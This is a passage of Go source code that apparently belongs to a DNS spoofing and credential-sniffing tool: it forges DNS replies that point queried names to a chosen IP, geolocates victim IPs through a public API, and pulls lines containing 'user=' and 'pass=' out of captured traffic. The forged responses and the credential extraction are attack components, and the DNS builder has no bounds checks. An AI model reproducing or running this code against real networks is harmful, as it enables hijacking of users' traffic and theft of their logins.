		domain.Write(packet[pos : pos+length])
		domain.WriteByte('.')
		pos += length
	}
	return strings.TrimSuffix(domain.String(), ".")
}

func buildDNSResponse(query []byte, ip string) []byte {
	resp := make([]byte, 512)
	copy(resp, query[:12])
	resp[2] |= 0x80
	resp[7] = 1

	questionLen := 0
	for i := 12; i < len(query) && query[i] != 0; i++ {
		questionLen++
	}
	questionLen += 5
	copy(resp[12:], query[12:12+questionLen])

	pos := 12 + questionLen
	resp[pos] = 0xc0
	resp[pos+1] = 0x0c
	resp[pos+2] = 0x00
	resp[pos+3] = 0x01
	resp[pos+4] = 0x00
	resp[pos+5] = 0x00
	resp[pos+6] = 0x00
	resp[pos+7] = 0x3c
	resp[pos+8] = 0x00
	resp[pos+9] = 0x04

	parts := strings.Split(ip, ".")
	for i, part := range parts {
		num, _ := strconv.Atoi(part)
		resp[pos+10+i] = byte(num)
	}

	return resp[:pos+14]
}

func getGeoIP(ip string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		log.Printf("Erreur géoloc: %v", err)
		return "Unknown"
	}
	defer resp.Body.Close()

	var result struct{ City, Country string }
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		log.Printf("Erreur parsing géoloc: %v", err)
		return "Unknown"
	}
	if result.City == "" {
		return "Unknown"
	}
	return fmt.Sprintf("%s, %s", result.City, result.Country)
}

func extractCredentials(data string) string {
	lines := strings.Split(data, "\r\n")
	for _, line := range lines {
		if strings.Contains(line, "user=") && strings.Contains(line, "pass=") {
			return strings.TrimSpace(line)
		}
	}
	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
